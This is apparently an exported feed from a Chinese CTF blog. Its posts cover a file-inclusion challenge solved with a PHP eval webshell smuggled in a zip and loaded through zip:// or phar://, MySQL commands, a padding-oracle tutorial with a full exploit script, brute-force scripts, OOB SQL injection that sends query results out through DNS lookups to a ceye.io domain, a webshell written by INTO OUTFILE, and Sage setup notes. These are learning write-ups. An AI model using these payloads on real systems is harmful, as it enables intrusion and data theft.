class=&quot;navbar-header&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;navbar-toggle collapsed&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbar&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;navbar&quot;&gt; &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Project name&lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt; &lt;ul class=&quot;nav navbar-nav&quot;&gt; &lt;li &lt;?php if ($page == &quot;home&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li &lt;?php if ($page == &quot;submit&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=submit&quot;&gt;Submit&lt;/a&gt;&lt;/li&gt; &lt;li &lt;?php if ($page == &quot;about&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=about&quot;&gt;About&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top: 50px&quot;&gt; &lt;?php include($file); echo $page; echo &quot;||&quot;; echo $file; ?&gt; &lt;/div&gt; &lt;script src=&quot;http://code.jquery.com/jquery-latest.js&quot; /&gt; &lt;script src=&quot;http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js&quot; /&gt; &lt;/body&gt;&lt;/html&gt; 可以发现index.php中会将?page参数加上’.php’，然后去包含。然后upload.php，会判断上传的文件的后缀是否为’.jpg’或者’.gif’或者’.png’，如果后缀不对，则会显示上传失败；如果后缀正确，则会在./Err0r目录下生成一个文件，文件名为随机生成的十六字节的字符串+’.jpg’，更何况提示也说了有个a.php，我们可以看到phpinfo信息，这个版本的php已经修复了%00漏洞，所以在文件名上动手脚什么的已经不太行了。 这里就需要另外的伪协议了，如zip和phar。我们可以利用这两个伪协议来读取压缩包中的文件，具体说明如下：12[http://php.net/manual/zh/book.phar.php](http://php.net/manual/zh/book.phar.php)[http://php.net/manual/zh/book.zip.php](http://php.net/manual/zh/book.zip.php) 具体解题如下： 先写一个php一句话木马，文件名为a.php，内容为&#39;&lt;?php eval($_POST[&quot;aaa&quot;]); ?&gt;&#39; 压缩一下变成a.zip，再更改文件名，将原来的a.zip改为a.jpg 上传a.jpg，通过upload.php的上传验证。 页面返回文件变换之后保存的路径以及文件名，用以下两个方法去包含12http://10.21.13.152:20050/?page=zip://./Err0r/RiiwLkgTlLxPRPsE.jpg%23apost:aaa=phpinfo(); 12http://10.21.13.152:20050/?page=phar://./Err0r/RiiwLkgTlLxPRPsE.jpg/apost:aaa=phpinfo(); 然后菜刀连一下。 然后随便翻翻目录就能找到flag]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux下的mysql使用]]></title>
    <url>%2F2017%2F11%2F26%2Flinux%E4%B8%8B%E7%9A%84mysql%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[最近在用docker搭题目，需要使用到mysql，以前在windows下都是用可视化界面，现在用命令行有点不习惯，记录下命令吧。 启动mysql：12service mysql startmysql -u root -p password 退出mysql1mysql&gt;exit 修改密码12mysql&gt;update mysql.user set password=passwoRd(&apos;test&apos;) where username=&apos;root&apos;;mysql&gt; flush privileges; 建数据库创建数据库名为mysql的数据库1mysql&gt;create database mysql; 删除数据库删除数据库名为mysql的数据库1mysql&gt;drop database mysql; 进入数据库进入数据库名为mysql的数据库1mysql&gt;use mysql; 查看所有数据库1mysql&gt;show databases; 创建数据表创建表名为users的数据表,字段分别为id(int),username(varchar(20)),password(varchar(50))，主键为id且自增1mysql&gt;create table users(id int auto_increment,username varchar(20),password varchar(50),primary key(id)); 查看所有表1mysql&gt;show tables; 查看某个表查看数据表名users的所有列1mysql&gt;desc users; 修改表名修改原users名为bbb1mysql&gt;alter table users rename to bbb; 修改表的列添加列age(int)：mysql&gt;alter table users add column age int; 删除列age：mysql&gt;alert table users drop column age 修改列属性：mysql&gt; alter table users modify age char(10); 删除id自增长：mysql&gt;alter table users change id id int; 删除主键：mysql&gt; alter table users drop primary key; 修改字段age为不为空：mysql&gt; alter table users change age age not null; 添加id为主键，自增长：mysql&gt; alter table users modify id int auto_increment primary key ; 设置id默认为0mysql&gt; alter table users modify id int default 0 ; 插入数据1mysql&gt;insert into users (username,password) values(&quot;zz&quot;,&quot;zz_is_handsome&quot;); 删除数据1mysql&gt;delete from users where username=&apos;zz&apos;; 修改数据1mysql&gt; update users set username=&apos;ZZ&apos; where id=0; 创建用户1mysql&gt;create user zz identified by &quot;root&quot;; 删除用户1mysql&gt; drop user zz; 查看权限1mysql&gt; show grants for zz; 赋予权限grant和revoke可以在几个层次上控制访问权限1，整个服务器，使用 grant ALL 和revoke ALL2，整个数据库，使用on database.*3，特点表，使用on database.table4，特定的列5，特定的存储过程1mysql&gt; grant select on sql1.* to zz; 回收权限1mysql&gt; revoke select on sql1.* from zz;]]></content>
  </entry>
  <entry>
    <title><![CDATA[Padding_Oracle 攻击]]></title>
    <url>%2F2017%2F11%2F23%2FPadding-Oracle-%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[道哥的《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式，据说这货在2011年的Pwnie Rewards上还被评为”最具价值的服务器漏洞”。而且比赛中经常遇到，而且一般都是混在web题里的crypto。 PS：ms10-070 适用于CBC模式下的AES，DES，3DES等分组密码 攻击成立的条件：121. 攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）2. 攻击者能够触发密文的解密过程，且能够知道密文的解密结果 原理尽量去看《白帽子讲web安全》，网上有些讲解原理有些问题，我看了半天才发现，而且后来虽然看懂了，但是代码实现又有些难度，就结合一些题目的wp中别人的代码去理解，然后自己实现一遍之后发现对原理理解更加深刻。 分组的填充(Padding)分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度: 这个时候，普遍的做法是在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充0×03。 123456781个字节的Padding为0x012个字节的Padding为0x023个字节的Padding为0x034个字节的Padding为0x045个字节的Padding为0x056个字节的Padding为0x067个字节的Padding为0x078个字节的Padding为0x08(当原始的明文正好是分组的整数倍的时候，Padding一个整组的填充值) just like:这种Padding原则遵循的是常见的PKCS#5标准 cbc(Cipher Block Chaining CBC)模式下加解密： 这里要注意，前几个分组的解密结果对我们都没有意义，我们重点关注的是最后一个分组的解密结果。看这张图可能会清楚一点: 攻击原理在Padding Oracle Attack攻击中，攻击者输入的参数是IV+Cipher，我们要通过对IV的”穷举”来请求服务器端对我们指定的Cipher进行解密，并对返回的结果进行判断。 当提交参数时，服务端的返回结果会有下面3种情况： 参数是一串正确的密文，分组、填充、加密都是对的(程序运行本身没出问题)，包含的内容也是正确的(业务逻辑是对的)，那么服务端解密、检测用户权限都没有问题，返回HTTP 200。 参数是一串错误的密文，包含不正确的bit填充(程序运行本身出现致命错误)，那么服务端解密时就会抛出异常，返回HTTP 500 server error。 参数是一串正确的密文(程序运行本身没出问题)，包含的用户名是错误的(业务逻辑是错的)，那么服务端解密之后检测权限不通过，但是依旧会返回HTTP 200戒者HTTP 302，而不是HTTP 500。 因此慢慢调整IV的值，以此希望解密后，最后一个字节的值为正确的padding byte，比如一个0x01。 破解密文得到明文先爆破出最后字节：因为Intermediray Value是固定不变的，所以我们可以通过遍历Initialization Vector的最后一个字节(从0x00带0xFF)，有且只有一个的值与Intermediray Value进行XOR后结果是0x01。通过遍历这255个值，我们得到了那个我们所需的IV，此时解密系统返回的是一个乱码，而不是解密失败，可以根据返回值来确定那个IV。PS：下面这图就是我开始说的网上有问题的地方，黄色应该是0x3c,蓝色的地方应该是0x3d,可以参考书本然后将我们现在得到的IV与目前填充的值通过XOR运算，我们可以算出Intermediray Value的最后一个字节，根据解密过程，将这个字节和真实的IV最后一个字节XOR，则是明文的最后一个字节~~ 爆破倒数第二个字节：在正确匹配了padding “0x01”后，需要做的是继续推导出剩下的Intermediary Byte。根据padding标准，当需要padding两个字节的时候，其值应该为0x02,0x02。而此时我们知道了Intermediary Byte为0x3d，因此我们可以先更新IV的最后一个字节为0x3d^0x02=0x3f(这样等会做XOR的时候，最后一位肯定一直为0x02,我们就只需要关注倒数第二位即可)，此时可以开始遍历IV倒数第二个字节了(0x00-0xFF),跟前面步骤一样。 接下来依次类推，就可以推导出所有Intermediary Byte，我们这时候就完成了不需要密钥来解密爆破得到了明文。 构造任意明文对应的密文根据上面的解法，我们可以得到Intermediary Value，而在这个前提下，而且我们可以控制IV，所以我们可以通过改变IV来使得XOR的结果为任意明文，还是观察这张图： 对于多个分组的密文来说，从最后一组密文开始往前推。以两个分组为例，当我们推出第二个分组的IV(我们通过改变IV来改变解密出来的明文)，而此时这个IV是第一个分组的密文，所以我们需要将这个IV作为第一个分组的密文再进行推导。 例题虽然上面的原理理解起来不难，但是具体情境中代码实现起来还是挺难的，所以还是用例题来详细说明吧 is_aes_secure题目是第三届上海市网络安全大赛的题目，题目源码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bin/ruby -wrequire &apos;openssl&apos;require &apos;base64&apos;def banner() puts &apos; ____________________________________________&apos; puts &apos;| |&apos; puts &apos;| Welcome to our secure communication system |&apos; puts &apos;| Our system is secured by AES |&apos; puts &apos;| So...No key! No Message! |&apos; puts &apos;|____________________________________________|&apos; puts &apos;&apos;enddef option() puts &apos;1. Get the secret message.&apos; puts &apos;2. Encrypt the message&apos; puts &apos;3. Decrypt the message.&apos; puts &apos;Give your option:&apos; STDOUT.flush op=gets return op.to_ienddef init() file_key=File.new(&quot;./aeskey&quot;,&quot;r&quot;) $key=file_key.gets file_key.close()enddef aes_encrypt(iv,data) cipher = OpenSSL::Cipher::AES.new(256, :CBC) cipher.encrypt cipher.key = $key cipher.iv = iv cipher.update(data) &lt;&lt; cipher.finalenddef aes_decrypt(iv,data) cipher = OpenSSL::Cipher::AES.new(256, :CBC) cipher.decrypt cipher.key = $key cipher.iv = iv data = cipher.update(data) &lt;&lt; cipher.finalenddef output_secret() file_secret=File.new(&quot;./flag&quot;,&quot;r&quot;) secret=file_secret.gets file_secret.close secret_enc=aes_encrypt(&quot;A&quot;*16,secret) secret_enc_b64=Base64.encode64(secret_enc) puts secret_enc_b64 endinitbannerwhile true do begin op=option if op==1 output_secret elsif op==2 puts &quot;IV:&quot; STDOUT.flush iv=Base64.decode64(gets) puts &quot;Data:&quot; STDOUT.flush data=Base64.decode64(gets) data_enc=aes_encrypt iv,data puts Base64.encode64(data_enc) puts &quot;Encrytion Done&quot; STDOUT.flush elsif op==3 puts &quot;IV:&quot; STDOUT.flush iv=Base64.decode64(gets) puts &quot;Data:&quot; STDOUT.flush data=Base64.decode64(gets) data_dec=aes_decrypt iv,data puts &quot;Decrpytion Done&quot; STDOUT.flush else puts &apos;Wrong Option&apos; STDOUT.flush end rescue Exception =&gt; e puts e.message STDOUT.flush retry endend 这个题是aes的cbc 256bit加密方式，从给出的脚本可以看出，我们可以得到flag的密文，而且我们可以通过操作3得知我们输入的iv和密文是否符合格式，所以，可以使用padding oracle attack。这个密文长48个字节，所以，这是分成3块的cbc加密，第一块密文原本使用原来的iv: AAAAAAAAAAAAAAAA作为iv来进行解密，第二块它使用第一块密文来进行解密，第三块使用第二块密文进行解密。这个加密过程，我们要不断更换iv，因为我们知道cbc模式是密文使用key进行加密得到一个中间值，中间值与iv逐位异或得到明文。根据padding的原理，我们只要一位一位进行爆破，求出中间值就好。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# coding=utf-8from pwn import *Cipher_Text = &apos;s\xf8\x804*S=\x06\x9b=,3\xea,E*\xaa\xc1\xcd\xf6\xcc\xb8\x1eQ\xf0\x81\xa9\x0e\xa4\x11\xfe\x9e\xdb\xd6\xbfm\xe7\xba\xb5\x02\xda\xbd\xb9\xc5\x1b\x7f\xb4\x90&apos;block1 = Cipher_Text[:16]block2 = Cipher_Text[16:32]block3 = Cipher_Text[32:]Origin_IV = &apos;A&apos;*16#Origin_IV = block1#Origin_IV = block2p = remote(&apos;106.75.98.74&apos;,10010)def Padding_Oracle_Attack(New_IV): p.recvuntil(&apos;option:\n&apos;) p.send(&apos;3\n&apos;) p.recvuntil(&apos;IV:\n&apos;) p.send(New_IV) p.recvuntil(&quot;Data:\n&quot;) p.send(block1.encode(&apos;base64&apos;)) response = p.recvline() print response if &quot;Decrpytion Done&quot; in response: print &apos;find true iv byte&apos; print New_IV return 1 else: print &apos;false&apos;Clear_Text = &apos;&apos;Known_Byte_IV = &apos;&apos;Known_Byte_Intermediary = &apos;&apos;#因为AES分组长度为16，所以Padding可以达到0x0f，而不是像DES的0x08for Now_Padding in xrange(1,17): #将已知的Intermediary Byte与当前需要构造的填充进行XOR,来构造出后面几位的IV for byte in Known_Byte_Intermediary: Known_Byte_IV += chr(ord(byte)^Now_Padding) #开始遍历0x00-0xFF for i in xrange(0,256): #未知的Intermediary Byte所对应的IV用&apos;0&apos;来补齐 Unknown_Byte_IV = (15-len(Known_Byte_Intermediary)) * chr(0) New_IV = Unknown_Byte_IV +chr(i)+Known_Byte_IV if Padding_Oracle_Attack(New_IV.encode(&apos;base64&apos;)): Now_Byte_Intermediary = chr(i^Now_Padding) Known_Byte_Intermediary = Now_Byte_Intermediary+Known_Byte_Intermediary Clear_Text_Byte = chr(Now_Byte_Intermediary^ord(Origin_IV[16-Now_Padding])) Clear_Text = Clear_Text_Byte+Clear_Text print Clear_Text Known_Byte_IV = &apos;&apos; break 分三次跑出三组的值，连起来就是flag。 工具工具：12[https://github.com/mpgn/Padding-oracle-attack](https://github.com/mpgn/Padding-oracle-attack)[https://github.com/GDSSecurity/PadBuster](https://github.com/GDSSecurity/PadBuster) 我感觉这种题目还是不适合用工具(因为我也没看懂这些工具怎么用)]]></content>
  </entry>
  <entry>
    <title><![CDATA[爆破脚本]]></title>
    <url>%2F2017%2F11%2F23%2F%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[有时比赛需要爆破一些东西，比如密钥种子，md5验证这种，觉得还是保存一下脚本代码，遇到的时候就可以直接修改一下用了。 md5验证爆破123456789101112131415# -*- coding:utf8 -*-import hashlib def crack_code(code): s = 100000 while 1: m2 = hashlib.md5() m2.update(repr(s)) if (m2.hexdigest()[0:4]==code): return s break s+=1 print crack_code(&apos;818d&apos;) crc爆破速度来说，c比python快很多，推荐用c python版本：123456789101112131415161718192021222324252627282930import zipfile,osimport binasciidef CRCcheck(crcs): for a in r: for b in r: for c in r: for d in r: for e in r: temp=chr(a)+chr(b)+chr(c)+chr(d)+chr(e); crc=binascii.crc32(temp); crc1=crc &amp; 0xFFFFFFFF; if (crc1 == crcs)or (hex(crc1)==crcs): f.write(temp); print &quot;ok&quot; return ;rootname=&apos;C:\\Users\\geqiang\\Desktop\\misc\\zippy&apos;;f=open(&quot;F:\\zippy.txt&quot;,&apos;a&apos;);r=range(32,127);for i in range(0,54): name=&quot;chunk&quot;+str(i)+&quot;.zip&quot;; print name; zipFile=zipfile.ZipFile(os.path.join(os.getcwd(), rootname+&quot;\\&quot;+name)); zipinfo=zipFile.getinfo(&apos;data.txt&apos;); crcs=zipinfo.CRC; print crcs CRCcheck(crcs); c版本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# include&lt;string.h&gt;# include &lt;stdio.h&gt;//来自：https://github.com/ETrun/crc32/blob/master/crc32.cstatic unsigned long Crc32_ComputeBuf(const void *buf, size_t bufLen) &#123; static const unsigned long crcTable[256] = &#123; 0x00000000,0x77073096,0xEE0E612C,0x990951BA,0x076DC419,0x706AF48F,0xE963A535, 0x9E6495A3,0x0EDB8832,0x79DCB8A4,0xE0D5E91E,0x97D2D988,0x09B64C2B,0x7EB17CBD, 0xE7B82D07,0x90BF1D91,0x1DB71064,0x6AB020F2,0xF3B97148,0x84BE41DE,0x1ADAD47D, 0x6DDDE4EB,0xF4D4B551,0x83D385C7,0x136C9856,0x646BA8C0,0xFD62F97A,0x8A65C9EC, 0x14015C4F,0x63066CD9,0xFA0F3D63,0x8D080DF5,0x3B6E20C8,0x4C69105E,0xD56041E4, 0xA2677172,0x3C03E4D1,0x4B04D447,0xD20D85FD,0xA50AB56B,0x35B5A8FA,0x42B2986C, 0xDBBBC9D6,0xACBCF940,0x32D86CE3,0x45DF5C75,0xDCD60DCF,0xABD13D59,0x26D930AC, 0x51DE003A,0xC8D75180,0xBFD06116,0x21B4F4B5,0x56B3C423,0xCFBA9599,0xB8BDA50F, 0x2802B89E,0x5F058808,0xC60CD9B2,0xB10BE924,0x2F6F7C87,0x58684C11,0xC1611DAB, 0xB6662D3D,0x76DC4190,0x01DB7106,0x98D220BC,0xEFD5102A,0x71B18589,0x06B6B51F, 0x9FBFE4A5,0xE8B8D433,0x7807C9A2,0x0F00F934,0x9609A88E,0xE10E9818,0x7F6A0DBB, 0x086D3D2D,0x91646C97,0xE6635C01,0x6B6B51F4,0x1C6C6162,0x856530D8,0xF262004E, 0x6C0695ED,0x1B01A57B,0x8208F4C1,0xF50FC457,0x65B0D9C6,0x12B7E950,0x8BBEB8EA, 0xFCB9887C,0x62DD1DDF,0x15DA2D49,0x8CD37CF3,0xFBD44C65,0x4DB26158,0x3AB551CE, 0xA3BC0074,0xD4BB30E2,0x4ADFA541,0x3DD895D7,0xA4D1C46D,0xD3D6F4FB,0x4369E96A, 0x346ED9FC,0xAD678846,0xDA60B8D0,0x44042D73,0x33031DE5,0xAA0A4C5F,0xDD0D7CC9, 0x5005713C,0x270241AA,0xBE0B1010,0xC90C2086,0x5768B525,0x206F85B3,0xB966D409, 0xCE61E49F,0x5EDEF90E,0x29D9C998,0xB0D09822,0xC7D7A8B4,0x59B33D17,0x2EB40D81, 0xB7BD5C3B,0xC0BA6CAD,0xEDB88320,0x9ABFB3B6,0x03B6E20C,0x74B1D29A,0xEAD54739, 0x9DD277AF,0x04DB2615,0x73DC1683,0xE3630B12,0x94643B84,0x0D6D6A3E,0x7A6A5AA8, 0xE40ECF0B,0x9309FF9D,0x0A00AE27,0x7D079EB1,0xF00F9344,0x8708A3D2,0x1E01F268, 0x6906C2FE,0xF762575D,0x806567CB,0x196C3671,0x6E6B06E7,0xFED41B76,0x89D32BE0, 0x10DA7A5A,0x67DD4ACC,0xF9B9DF6F,0x8EBEEFF9,0x17B7BE43,0x60B08ED5,0xD6D6A3E8, 0xA1D1937E,0x38D8C2C4,0x4FDFF252,0xD1BB67F1,0xA6BC5767,0x3FB506DD,0x48B2364B, 0xD80D2BDA,0xAF0A1B4C,0x36034AF6,0x41047A60,0xDF60EFC3,0xA867DF55,0x316E8EEF, 0x4669BE79,0xCB61B38C,0xBC66831A,0x256FD2A0,0x5268E236,0xCC0C7795,0xBB0B4703, 0x220216B9,0x5505262F,0xC5BA3BBE,0xB2BD0B28,0x2BB45A92,0x5CB36A04,0xC2D7FFA7, 0xB5D0CF31,0x2CD99E8B,0x5BDEAE1D,0x9B64C2B0,0xEC63F226,0x756AA39C,0x026D930A, 0x9C0906A9,0xEB0E363F,0x72076785,0x05005713,0x95BF4A82,0xE2B87A14,0x7BB12BAE, 0x0CB61B38,0x92D28E9B,0xE5D5BE0D,0x7CDCEFB7,0x0BDBDF21,0x86D3D2D4,0xF1D4E242, 0x68DDB3F8,0x1FDA836E,0x81BE16CD,0xF6B9265B,0x6FB077E1,0x18B74777,0x88085AE6, 0xFF0F6A70,0x66063BCA,0x11010B5C,0x8F659EFF,0xF862AE69,0x616BFFD3,0x166CCF45, 0xA00AE278,0xD70DD2EE,0x4E048354,0x3903B3C2,0xA7672661,0xD06016F7,0x4969474D, 0x3E6E77DB,0xAED16A4A,0xD9D65ADC,0x40DF0B66,0x37D83BF0,0xA9BCAE53,0xDEBB9EC5, 0x47B2CF7F,0x30B5FFE9,0xBDBDF21C,0xCABAC28A,0x53B39330,0x24B4A3A6,0xBAD03605, 0xCDD70693,0x54DE5729,0x23D967BF,0xB3667A2E,0xC4614AB8,0x5D681B02,0x2A6F2B94, 0xB40BBE37,0xC30C8EA1,0x5A05DF1B,0x2D02EF8D &#125;; unsigned long crc32 = 0xFFFFFFFF; unsigned char *byteBuf; size_t i; byteBuf = (unsigned char*)buf; for (i = 0; i &lt; bufLen; i++) &#123; crc32 = (crc32 &gt;&gt; 8) ^ crcTable[(crc32 ^ byteBuf[i]) &amp; 0xFF]; &#125; return crc32 ^ 0xFFFFFFFF;&#125;static char *charSet = &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@\n &quot;;int main() &#123; unsigned long crc32[] = &#123; 1606238046, 1943531056, 3598719407L, 2578797435L, 1405086858, 2143805016, 3234701029L, 3224637410L, 2346013297L, 1146766327, 4038678768L, 3119445409L, 2111148220, 383413051, 2853461348L, 3176759361L, 1852520927, 3083243303L, 2151747034L, 1392140456, 544449252, 1871340857, 574988077, 3459049483L, 2786065872L, 3888485555L, 1716930793, 1933746678, 3178216769L, 3774357278L, 622718466, 1488109481, 525106857, 3123386181L, 3472027048L, 616379830, 3728848209L, 1358333123, 1852520927, 3096466191L, 622718466 &#125;; char tmp[6] = &quot;&quot;; int len = strlen(charSet); for (int h = sizeof(crc32) / sizeof(unsigned long) - 1;h&gt;=0; h--) &#123; for (int a = 0; a &lt; len; a++) &#123; tmp[0] = charSet[a]; for (int b = 0; b &lt; len; b++) &#123; tmp[1] = charSet[b]; for (int c = 0; c &lt; len; c++) &#123; tmp[2] = charSet[c]; for (int d = 0; d &lt; len; d++) &#123; tmp[3] = charSet[d]; for (int e = 0; e &lt; len; e++) &#123; tmp[4] = charSet[e]; if (Crc32_ComputeBuf(tmp, strlen(tmp)) == crc32[h]) &#123; printf(&quot;%s&quot;, tmp); //goto label; //若是存在碰撞，那么这里可以将这里注释掉 &#125; &#125; &#125; &#125; &#125; &#125; label : ; printf(&quot;\n&quot;); &#125; return 0;&#125; 种子密钥爆破123456789101112131415161718192021222324252627282930&lt;?phpfunction auth_code($length = 12, $special = true)&#123; $chars = &apos;abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;; if ($special) &#123; echo 1; $chars .= &apos;!@#$%^&amp;*()&apos;; &#125; $password = &apos;&apos;; for ($i = 0; $i &lt; $length; $i++) &#123; $password .= substr($chars, mt_rand(0, strlen($chars) ‐ 1), 1); &#125; return $password;&#125;while(True)&#123; $seed = rand(0,99999); mt_srand($seed); $key = auth_code(16, false); if($key == &quot;k Cfnh ISk Ty Ip4a Ae&quot;) &#123; echo $seed; echo &quot;\n&quot;; break; &#125;&#125;$private = auth_code(10, false);echo $private;echo &quot;\n&quot;;?&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[OOB注入]]></title>
    <url>%2F2017%2F11%2F16%2FOOB%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[源于HCTF2017的一道题目，看来自己还是太年轻了，这种注入自己以前一直没见过，然后一搜一大把。 SQL注入类型细分，分为以下5种：123451. Boolean-based blind SQL injection 2. Error-based SQL injection3. UNION query SQL injection4. Stacked queries SQL injection5. Time-based blind SQL injection 共计3大类：1231. inband2. inference3. out of band(OOB) OOB与我们熟知的inband类的注入相反。inband是利用web应用来直接获取数据，比如Error-based SQL injection和UNION query SQL injection都是属于inband类，它们都是通过web的响应或者错误反馈来提取数据。 而inference则是通过web的一些反映来推断数据，比如Boolean-based blind SQL injection和Stacked queries SQL injection 也就是我们通俗的盲注，通过web应用的其他改变来推断数据。 我们的主角OOB则是通过其他传输方式来获得数据，比如利用我们等会要说到的DNS解析协议和电子邮件。当你遇到了某些很隐蔽的注入点，inband类注入没办法用，inference类注入被你嫌弃太慢的时候，OOB就是你最好的选择了。 如何查看mysql是否开启了文件导入导出？mysql&gt;show global variables like &#39;%secure%&#39;;如果secure_file_priv的值为null，则没开启；如果为空，则开启；如果为目录，则说明只能在该目录下操作。 如何修改secure_file_priv？1234windows下：修改my.ini 在[mysqld]内加入secure_file_priv =linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =MYSQL新特性secure_file_priv对读写文件的影响然后重启mysql，再查询secure_file_priv 原理什么的：123[http://bobao.360.cn/learning/detail/3458.html](http://bobao.360.cn/learning/detail/3458.html)[http://www.freebuf.com/vuls/138838.html](http://www.freebuf.com/vuls/138838.html)[http://www.jianshu.com/p/95c814c515a2](http://www.jianshu.com/p/95c814c515a2) 大致就是如果目标服务器是搭在win下，且有能操控文件的函数，且配置不当，如mysql中的secure_file_priv全局系统变量配置问题，就有可能会触发OOB注入。注入过程呢，是通过那些函数，例如load_file()去发送DNS请求，然后将我们的查询语句构造在DNS查询中，例如：12345利用payload是：load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\abc&apos;))concat是字符串拼接database()就是你要做SQL注入查询的地方&apos;.xxxx.ceye.io\abc&apos;就是你的dnslog平台给你的域名后面的abc可以改也可以不改，无所谓的，你乐意写啥就写啥 这里的域名是在http://ceye.io/中注册得到的。 boring website这是HCTF2017的一道题目。题目：https://github.com/hammerorz/HCTF2017-easy-sign-and-boring-websitewp：https://xianzhi.aliyun.com/forum/topic/1589/ 知道了这个注入之后就很好做了，直接抄wp了 发现应该是sql server用linkserver来连接mysql。所以去查了一波linkserver的用法，以及结合注释可得select * from openquery(mysql,&#39;select xxx&#39;)可以从mysql数据库中查得信息，但是没有回显，sleep函数也被ban了，然后看到oob的提示，去查了一波mysql out-of-band，发现load_file函数可以通过dns通道把所查得的数据带出来。接下来的过程就是十分常见简单的mysql注入的流程。 这里值得另外一提的是，本来不知道原来还能用openquery来进行连接不同的服务器，又学到了。 我将题目重新搭了一下，不过因为本地没有安装sql server，所以就没有搭sql servser环境，只是复现了load_file的dns查询。而一开始没有成功，发现是少了配置条件，没有配置secure-file-priv。截图如下： 本地数据库信息 重新搭的题目源码12345678910111213141516171819202122232425&lt;?php$conn=@mysql_connect(&quot;localhost&quot;,&apos;root&apos;,&apos;root&apos;) or die(&quot;数据库连接失败！&quot;);;#echo &quot;Connected to MySQL&lt;br /&gt;&quot;;echo &quot;Connected to MYSQL&lt;br /&gt;&quot;;mysql_select_db(&quot;sql4&quot;,$conn) or die(&quot;您要选择的数据库不存在&quot;);if(isset($_GET[&apos;id&apos;]))&#123;$id = $_GET[&apos;id&apos;];if(preg_match(&apos;/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare|if|insert|into|outfile|dumpfile|sleep|wait|benchmark/i&apos;, $id)) &#123;die(&apos;stupid hacker&apos;);&#125;$query = &quot;select username from not_here where id = $id&quot;; $stmt = mysql_query( $query );$arr=@mysql_fetch_array($query);if (is_array($arr))&#123;//TO DO: ...//It&apos;s time to sleep...&#125;&#125;else print(&quot;?id&quot;);?&gt; payload1?id=8 union select load_file(concat(&quot;\\\\&quot;,(select password from secret),&quot;.3g3dxq.ceye.io\\abc&quot;)) 结果 PS:在搜索这些函数的时候，学会一个新姿势,算是意外之喜吧。用mysql写一句话:1select &apos;&lt;?php eval($_POST[cmd])?&gt;&apos; into outfile &apos;D:/PHPnow-1.5.4/htdocs/index2.php&apos;]]></content>
  </entry>
  <entry>
    <title><![CDATA[sage安装]]></title>
    <url>%2F2017%2F11%2F16%2Fsage%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Sage可以干什么？介绍中有这么一句：“这款开源软件的支持者称Sage能够完成从12维物体到计算全球变暖效应数学模型中的降雨量的任何事情。”Sage包含了从线性代数、微积分，到密码学、数值计算、组合数学、群论、图论、数论等各种初高等数学的计算功能。 Sage的一大特点是整合了众多优秀的开源数学软件，使用户可以在Sage中方便的使用这些库中的相应功能。Sage目前整合了近一百个开源的数学库，这其中包括著名的ATLAS、BLAS、LAPACK、Boost、GSL、SciPy等等，完整列表可以查看这里。 Sage基于并使用Python，Python程序可以在Sage中直接运行，也可以在Sage中使用Python的各种库，感觉就像是提供了一个包含各种数学功能的Python环境。 安装这里介绍linux下的安装。官网下载地址：http://www.sagemath.org/根据自己的环境找到安装包，我这里安装的是http://mirror.hust.edu.cn/sagemath/linux/64bit/index.html下的64位的包。 下载好之后用以下命令:12tar xvf sage-8.0-Ubuntu_16.04-x86_64.tar.bz2cd SageMath 然后就能使用sage工具了，使用命令如下12345678910111213141516$ ./sageRewriting paths for your new installation directory===================================================This might take a few minutes but only has to be done once.patching /home/user/tmp/SageMath/src/build/cythonized/sage/structure/list_clone.c(snip)patching /home/user/tmp/SageMath/src/build/cython_debug/cython_debug_info_sage.gsl.ode┌────────────────────────────────────────────────────────────────────┐│ SageMath Version 6.10, Release Date: 2015-12-18 ││ Type &quot;notebook()&quot; for the browser-based notebook interface. ││ Type &quot;help()&quot; for help. │└────────────────────────────────────────────────────────────────────┘sage: 这样是用交互式来使用sage。 如果是想使用.sage代码的话，直接执行以下命令:1./sage ***.sage 即可运行sage文件 